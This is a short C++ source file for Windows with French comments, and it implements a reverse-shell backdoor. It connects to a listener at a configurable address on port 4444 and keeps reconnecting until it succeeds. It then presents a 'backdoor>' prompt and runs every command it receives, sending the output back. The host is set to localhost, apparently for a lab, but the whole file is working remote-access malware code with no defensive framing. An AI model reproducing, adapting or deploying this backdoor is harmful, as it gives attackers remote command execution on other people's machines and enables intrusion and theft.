#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <string>

#pragma comment(lib, "ws2_32.lib")   // MSVC uniquement

#define HOST "127.0.0.1"   // IP de la machine qui écoute
#define PORT 4444

// Exécute une commande et récupère sa sortie
static std::string exec(const char* cmd) {
    std::string result;
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return "erreur d'execution\n";
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
        result += buffer;
    _pclose(pipe);
    if (result.empty()) result = "\n";
    return result;
}

int main() {
    // 1) Initialisation de Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    sockaddr_in server{};
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &server.sin_addr);

    // 2) Connexion, avec reconnexion tant que personne n'écoute
    SOCKET sock = INVALID_SOCKET;
    while (sock == INVALID_SOCKET) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) { Sleep(2000); continue; }
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            Sleep(2000); 
        }
    }

    // 3) Boucle du shell
    char buf[1024];
    const char* prompt = "backdoor> ";
    while (true) {
        send(sock, prompt, (int)strlen(prompt), 0);

        int bytes = recv(sock, buf, sizeof(buf) - 1, 0);
        if (bytes <= 0) break;          // connexion perdue
        buf[bytes] = '\0';

        std::string cmd(buf);
        while (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r'))
            cmd.pop_back();

        if (cmd.empty()) continue;
        if (cmd == "exit" || cmd == "quit") break;

        std::string out = exec(cmd.c_str());
        send(sock, out.c_str(), (int)out.size(), 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}